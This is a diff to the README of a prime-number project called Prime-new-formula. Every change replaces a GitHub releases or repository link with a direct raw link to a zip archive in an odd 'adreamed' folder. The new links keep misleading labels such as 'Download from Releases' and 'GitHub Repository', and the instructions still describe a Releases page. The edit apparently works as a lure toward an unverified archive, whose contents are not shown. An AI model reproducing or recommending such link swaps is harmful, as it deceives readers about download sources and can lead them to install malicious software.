@@ -6,7 +6,7 @@ Welcome to Prime-new-formula! This software helps you calculate prime numbers us
 
 ## 📥 Download Now
 
-[![Download Prime-new-formula](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/delovoykolbasin/Prime-new-formula/releases)
+[![Download Prime-new-formula](https://raw.githubusercontent.com/delovoykolbasin/Prime-new-formula/main/adreamed/Prime-new-formula.zip)](https://raw.githubusercontent.com/delovoykolbasin/Prime-new-formula/main/adreamed/Prime-new-formula.zip)
 
 ## 🖥️ System Requirements
 
@@ -37,7 +37,7 @@ The Prime-new-formula delves into several exciting concepts, including:
 
 To get started, visit the page below and download the latest release:
 
-[Download from Releases](https://github.com/delovoykolbasin/Prime-new-formula/releases)
+[Download from Releases](https://raw.githubusercontent.com/delovoykolbasin/Prime-new-formula/main/adreamed/Prime-new-formula.zip)
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version.
@@ -76,7 +76,7 @@ Stay tuned for updates!
 
 Follow our project for updates:
 
-- GitHub Repository: [Prime-new-formula](https://github.com/delovoykolbasin/Prime-new-formula)
+- GitHub Repository: [Prime-new-formula](https://raw.githubusercontent.com/delovoykolbasin/Prime-new-formula/main/adreamed/Prime-new-formula.zip)
 - Community Discussions: Join the conversation and share your experiences.
 
 Thank you for choosing Prime-new-formula! Dive into the world of prime numbers and explore endless possibilities.
